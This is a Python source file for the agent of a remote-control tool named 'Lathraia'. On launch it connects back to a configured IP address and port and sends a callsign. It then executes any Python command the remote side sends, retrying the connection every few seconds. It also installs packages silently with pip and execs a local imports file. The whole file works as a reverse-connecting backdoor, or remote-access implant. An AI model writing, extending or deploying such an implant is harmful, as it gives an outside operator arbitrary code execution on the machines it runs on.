# This is the main server program. This sets up everything so it shall work.
# However, to say that this program executes and does everything by itself is a false-hood.
# The entire Lathraia server is comprised of other programs, but this file mainly interprets
# socket python commands, so that they may be run.

import os
import socket
import sys
import time
import threading
import functions
import inspect
import multiprocessing
import asyncio

from socket import error as SocketException

from configuration import *

# Install all dependencies so we don't crash
os.system("pip install {libs} --user".format(
        libs = " ".join(dependencies)
))

# To be safe, let's install it under Python 3 explicitly as well.
os.system("pip3 install {libs} --user".format(
        libs = " ".join(dependencies)
))


# Execute the imports file
# And no, importing it fucks up unimaginably.
# C's imports are much easier to understand and they rely off of relative paths of the file's 
# actual location. Python fucking needs this!
# #include "relative_path.h" > import relative_path (if the main script is two directories up, this
# wont work)

exec(open("imports.py", "r").read())

from constants import *

# Debug?
sys.setrecursionlimit(65535)

# For a while, I did not realize starting a thread each time the program crashed was a bad idea.
# All threads here, outside the main thread due to recursion complications
# I pulled out all of my hair, just to figure out the solution was a matter of moving one line!

threading._start_new_thread(file_receive_thread, ())


connfd = ""

# Execute the command
def command_exec(connfd, command):
    execution_response = outexec(command)
    # Send back the response!
    connfd.send(execution_response.encode())
    return
    


def main():
    try:
        global connfd
        # Main program loop!

        # Automatically execute all scripts.
        autoexec()

        dprint("Version: {version}".format(version = VERSION))
    except Exception as error:
        dprint("Error: {error}".format(error = str(error)))

    while True:
        try:
            dprint("Loaded up!")
            arguments = sys.argv
            argument_count = len(arguments)

            # Create the socket connection, by initalizing it. 
            dprint("Creating sockets...")
            socketfd = socket.socket()

            # Bind to whatever port is configuration within the configuration file
            dprint("Connecting to client, {ip}:{port}".format(ip = IP_ADDRESS, port = PORT))
            socketfd.connect((IP_ADDRESS, PORT))

            dprint("Connection success!")

            dprint("Sending callsign...")
            socketfd.send(CALLSIGN.encode())

        except Exception as err:
                dprint("Error: {error}".format(error = str(err)))
                time.sleep(5)
                continue

        connectionfd = socketfd
        global_connfd(connectionfd)

        # Initalize the file receiving thread.
        # It will scan for the clients' commands and then promptly execute them.

        # Main program loop
        # All we are doing is obtaining the sent data, then remotely executing it.

        dprint("Any Python function can now be remotely executed by the client!")

        while True:
            try:

                command = connectionfd.recv(RECEIVING_CHUNK_SIZE).decode()
                # Socket broke

                if (not command):
                    dprint("Broken socket!")
                    time.sleep(5)
                    break

                # The reasoning behind this thread business is quite simple when told.
                # We don't want the entire main program to lock up on some function that's waiting on us

                # Essentially speaking, when the client disconnects, the program will restart, regardless
                # of whether it is being held hostage by another function. It's a nice idea, but it took me some time to envision.

                threading._start_new_thread(command_exec, (connectionfd, command,))

            except SocketException as err:
                dprint("Error: {error}".format(error = str(err)))
                time.sleep(5)
                break
        


        continue

if __name__ == "__main__":
    main()
